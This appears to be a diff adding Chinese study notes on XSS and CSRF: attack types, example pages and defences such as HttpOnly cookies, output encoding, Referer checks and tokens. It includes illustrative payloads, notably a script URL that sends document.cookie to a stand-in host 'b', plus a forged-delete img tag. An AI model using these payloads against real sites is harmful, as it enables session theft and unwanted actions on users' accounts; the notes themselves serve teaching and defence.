@@ -828,6 +828,139 @@ has 值校验文件是否已上传过的校验接口
 
 - 作用域
 
+## 什么是 XSS
+
+XSS：Cross Site Script，跨站脚本攻击
+
+利用恶意脚本对客户端网页进行篡改，从而在用户浏览页面时获取用户隐私数据的一种攻击方式
+
+**分类：**
+
+- 反射型
+
+非持久型 XSS，将用户输入的数据“反射”给浏览器，一般是通过诱导用户去点击一个带有恶意脚本的链接
+
+例如 http://a.jsp?name=k 是一个存在反射型 XSS 漏洞的网站，它的 jsp 页面会取name 参数并直接渲染到页面上
+
+假如如果有人在论坛发了一个这样的链接：
+
+    http://a.jsp?name=<script>document.write("<img src='http://b?key=" + escape(document.cookie) + "'>")</script>
+
+当我们去点击这个链接时，我们在 a 网站的 cookie 就被作为参数发送到了黑客的 b 网站，只要黑客在 b 网站里接收参数 key，就可以拿到你的 cookie，做到 XSS 攻击
+
+- 存储型
+
+持久型 XSS，将用户输入的数据“存储”在服务端（数据库）
+
+一般是出现在发表文章的网站上，黑客发表一个带有恶意脚本的文章，发表后所有访问文章的用户都将执行恶意脚本
+
+例如 http://a.im 网站是一个博客网站，用户可以在上面发表文章，点击提交时，会将 textarea 里的值作为文章的内容发送到服务端，存在数据库中
+
+这时黑客在 textarea 中输入如下信息：
+
+    <div>
+        ...
+    </div>
+    <script>
+        alert(document.cookie);
+    </script>
+
+然后发表文章，文章 URL 为 http://a.im/article/10001
+
+当每个用户打开这个文章阅读时，就会执行这个恶意脚本，被获取到 cookie 的信息
+
+- Dom Based XSS
+
+通过修改页面 DOM 节点形成 XSS，也是反射型的一种
+
+例如页面 http://a.im?url=XXX 有如下结构：
+
+    const s = location.search.substring(1);
+    const url = getParam(s, 'url'); // 从 ?name=XXX 获取值
+
+    document.getElementById("url").innerHTML = "<a href='" + url + "'>link</a>";
+
+如果这时有个链接是：
+
+    http://a.im?url=javascript:alert(document.cookie)
+
+就会执行这个恶意脚本，被获取到 cookie 信息
+
+**预防：**
+
+- HttpOnly
+
+可以看到，经常都会通过 JS 脚本获取 document.cookie 来盗取信息，给 cookie 设置 HttpOnly 属性，让脚本无法读取到 cookie
+
+- 谨慎使用
+
+.innerHTML、.outerHTML、document.write() 等直接输出 DOM 文本要谨慎使用
+
+还有 location、onclick、onerror、onload、onmouseover、a 标签的 href、eval()、setTimeout()、setInterval() 都能将字符串作为代码进行
+
+- 输入检查
+
+检查用户输入的数据是否包含 <、> 等特殊字符，若存在特殊字符可以进行过滤或编码
+
+- 输出检查
+
+后端如使用 JSP 输出 HTML 时，若变量输出在 HTML 上，可以编码或转义
+
+## 什么是 CSRF
+
+CSRF：Cross Site Request Forgery，跨站请求伪造
+
+劫持受信任用户向服务器发送非预期请求的攻击方式
+
+假如有一个博客网站 http://www.c.im
+
+用户**登录**后，可以删除自己的文章，删除时前端会调用接口：
+
+    http://www.c.im/article/delete/:id
+
+而用户在登录时，会设置包含自己身份信息的 cookie，伴随接口调用一起发送给后端
+
+当**用户尚未关闭 c 网站时（或 c 网站 cookie 还未过期）**，他打开了恶意网站 b：
+
+    http:// www.b.im
+
+而 b 网站有如下结构：
+
+    <img src="http://www.c.im/article/delete/10">
+
+这样，当用户打开 b 攻击网站时，就会发起一条 c 网站的删除请求（img 不会有跨域问题），而因为 c 网站的 cookie 依旧在有效期，会跟着这条请求一并被发送，导致用户 id 为 10 的文章就被删除了
+
+这个过程中，攻击者**借助**受害者的 cookie 来骗取服务端的信任，但不能拿到 cookie，也看不到 cookie 内容，只是利用请求携带来修改服务端的数据
+
+**预防：**
+
+- 验证码
+
+被认为是对抗 CSRF 最简洁有效的方法
+
+从示例可以知道，CSRF 攻击是在用户不知情的情况下构造网络请求，攻击者主要利用已知的请求参数，利用受害者的 cookie 来骗取服务端信任，而对未知的东西攻击者也无法模仿，可以利用验证码强制用户进行交互才能完成请求
+
+但是验证码并不能万能的，出于对用户考虑，不可能给所有操作都加上验证码而导致用户体验不佳
+
+- Referer
+
+根据 HTTP 协议，HTTP 头有个字段叫 Referer，记录了 HTTP 请求的来源
+
+可以通过 Referer 检查请求是否来自合法的源，如上例中用户在 c 网站进行删除操作，请求是在 c 网站发起，Referer 为 http://www.c.im，而攻击者是在 b 网站发起的请求，Referer 则会是 http://www.b.im，这样可以根据 Referer 去校验是否是合法请求源
+
+- Token
+
+CSRF 可以攻击成功，是因为攻击者可以伪造请求，用户验证信息是存在 cookie 中的，攻击者可以在不知情这些验证信息的情况下直接利用用户自己的 cookie 通过验证
+
+关键在于在请求中放入攻击者不能伪造的信息
+
+可以在用户登录时，利用用户信息进行加密生成 token 后返回给前端，前端存储后每次请求可以作为参数带上发送给后端，后端再进行解密校验，校验不通过拒绝请求
+
+
+
+
+
+
 
 
 
